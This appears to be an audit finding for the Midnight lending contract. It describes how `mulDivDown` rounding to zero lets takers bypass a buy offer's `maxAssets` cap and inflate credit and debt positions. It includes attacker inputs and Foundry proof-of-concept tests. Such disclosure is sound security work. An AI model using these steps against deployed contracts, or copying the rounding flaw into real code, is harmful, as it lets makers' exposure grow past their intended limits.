### Title
Buy Offer `maxAssets` Cap Bypassed in Unit Terms via `mulDivDown` Rounding to Zero - (`src/Midnight.sol`)

### Summary
When a buy offer uses `maxAssets` as its cap, the consumed counter is incremented by `buyerAssets = mulDivDown(units, buyerPrice, WAD)`. Because `buyerPrice < WAD` for all valid ticks, a taker can choose `units` small enough that `units * buyerPrice < WAD`, causing `buyerAssets = 0`. The consumed counter does not advance, yet position state (credit, debt, `totalUnits`) is updated by the full `units` amount. This allows repeated zero-cost fills that accumulate unbounded unit exposure beyond the maker's intended `maxAssets` cap.

### Finding Description
**Code path** — `src/Midnight.sol`, `take()`, lines 363–369:

```solidity
uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
// ...
if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

For a buy offer (`offer.buy = true`), `buyerPrice = tickToPrice(tick) + settlementFee`. Since `tickToPrice` always returns ≤ WAD and settlement fees are small, `buyerPrice < WAD` is the normal case. When `units * buyerPrice < WAD`, `mulDivDown` returns 0. The consumed counter increments by 0, the `require(newConsumed <= offer.maxAssets)` check trivially passes, but lines 408–414 still apply the full `units` to positions:

```solidity
buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);
sellerPos.debt   += UtilsLib.toUint128(sellerDebtIncrease);
_marketState.totalUnits += buyerCreditIncrease - sellerCreditDecrease;
```

**Attacker inputs**: `offer.buy = true`, `offer.maxAssets = N`, `offer.tick` such that `buyerPrice < WAD`, `units` chosen so `units * buyerPrice < WAD` (e.g., `units = 1` at any sub-WAD price). The taker can be `msg.sender` directly (no EcrecoverAuthorizer required) or an operator authorized via `EcrecoverAuthorizer.setIsAuthorized → Midnight.setIsAuthorized`.

**Why checks fail**: The `ConsumedAssets` guard only checks the asset-denominated counter. It has no awareness of the unit-denominated exposure added to positions. When `buyerAssets = 0`, the guard is a no-op regardless of how many units are filled.

**Protocol acknowledgment**: The protocol itself documents this at `src/Midnight.sol` line 94: *"It is possible to give units to a fully consumed assets-based buy offer with price < 1."* The test `testBugBuyMaxAssetsBypass` (lines 858–889 of `test/TakeTest.sol`) explicitly demonstrates the exact scenario: consumed stays at `maxAssets`, token balances are unchanged, but `creditOf`, `debtOf`, and `totalUnits` all increase.

### Impact Explanation
A maker who posts a buy offer with `maxAssets = N` intends to cap their total credit exposure at `N` loan tokens. An attacker can call `take(units=1)` repeatedly (or in a single call with `units` just below the rounding threshold), accumulating arbitrarily large credit/debt positions in the market while the consumed counter never exceeds `N`. The maker's unit-denominated exposure is unbounded despite the asset cap. This violates the invariant: *offers cannot be overfilled*.

### Likelihood Explanation
Preconditions are minimal: any buy offer with `maxAssets > 0` and `buyerPrice < WAD` (the normal case for all sub-WAD ticks) is vulnerable. No special privileges are needed — any `msg.sender` can be the taker. The condition `units * buyerPrice < WAD` is trivially satisfied with `units = 1` at any realistic price. The attack is repeatable indefinitely and costs only gas.

### Recommendation
Track consumed in unit terms when `offer.buy = true` and `maxAssets > 0`, or add a parallel unit-denominated cap check. Concretely, when `buyerAssets == 0` and `units > 0`, either revert or add `units` to a separate unit counter that is also bounded. Alternatively, enforce `require(units == 0 || buyerAssets > 0)` to prevent zero-asset fills from advancing position state.

### Proof of Concept
The existing test `testBugBuyMaxAssetsBypass` in `test/TakeTest.sol` (lines 858–889) already proves this. A fuzz extension:

```solidity
function testFuzz_BuyMaxAssetsBypassUnits(uint256 units, uint256 tick) public {
    // buyerPrice < WAD at any tick < MAX_TICK
    tick = bound(tick, 0, MAX_TICK - 16);
    units = bound(units, 1, WAD / TickLib.tickToPrice(tick)); // ensures buyerAssets = 0

    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1;
    lenderOffer.tick = tick;

    collateralize(market, borrower, units);
    deal(address(loanToken), lender, 0);

    uint256 creditBefore = midnight.creditOf(id, lender);
    take(units, borrower, lenderOffer);

    // Assertion: consumed did not exceed maxAssets
    assertLe(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
    // Invariant violated: units were credited despite maxAssets being "full"
    assertGt(midnight.creditOf(id, lender), creditBefore);
    // Core invariant: total units filled * price / WAD <= maxAssets — FAILS
    assertLe(units * TickLib.tickToPrice(tick) / WAD, lenderOffer.maxAssets); // will fail
}
```

    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
